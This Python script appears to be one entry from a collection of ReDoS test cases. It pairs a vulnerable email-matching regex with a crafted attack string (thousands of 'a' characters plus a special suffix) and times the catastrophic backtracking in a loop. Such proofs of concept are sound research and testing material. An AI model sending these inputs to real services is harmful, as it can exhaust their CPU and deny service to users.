# 7223
# ([a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]+(?:\.[a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]+)*)@((?:[a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]+\.)*[a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]{0,66})\.([a-z\u4e00-\u9eff\u00C0-\u017F_]{2,6}(?:\.[a-z\u4e00-\u9eff\u00C0-\u017F_]{2})?)
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:""+"a"*10000+"◎@! _1! _1SLQ_1"

import re
from time import perf_counter

regex = """([a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]+(?:\.[a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]+)*)@((?:[a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]+\.)*[a-z\u4e00-\u9eff\u00C0-\u017F0-9-_]{0,66})\.([a-z\u4e00-\u9eff\u00C0-\u017F_]{2,6}(?:\.[a-z\u4e00-\u9eff\u00C0-\u017F_]{2})?)"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "a" * i * 10000 + "◎@! _1! _1SLQ_1"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")